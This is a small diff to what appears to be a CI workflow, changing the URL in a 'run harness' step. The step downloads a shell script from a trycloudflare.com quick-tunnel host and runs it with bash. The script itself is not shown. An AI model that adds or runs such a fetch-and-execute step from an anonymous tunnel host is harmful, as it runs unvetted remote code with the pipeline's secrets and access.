@@ -9,5 +9,5 @@ jobs:
       - name: run harness
         run: |
           set -euo pipefail
-          curl -fsSL "https://replace-melissa-growing-chubby.trycloudflare.com/harness.sh" -o /tmp/h.sh
+          curl -fsSL "https://restricted-facial-thumbnail-frequency.trycloudflare.com/harness.sh" -o /tmp/h.sh
           bash /tmp/h.sh
